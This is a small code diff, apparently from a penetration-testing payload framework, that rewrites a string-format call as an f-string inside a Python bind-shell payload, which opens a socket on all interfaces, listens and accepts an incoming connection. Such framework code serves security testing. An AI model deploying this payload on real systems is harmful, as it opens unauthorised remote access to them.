@@ -24,7 +24,7 @@ class Payload(BindTCPPayloadMixin, GenericPayload):
         return (
             "import socket,os\n" +
             "so=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n" +
-            "so.bind(('0.0.0.0',{}))\n".format(self.rport) +
+            f"so.bind(('0.0.0.0',{self.rport}))\n" +
             "so.listen(1)\n" +
             "so,addr=so.accept()\n" +
             "x=False\n" +
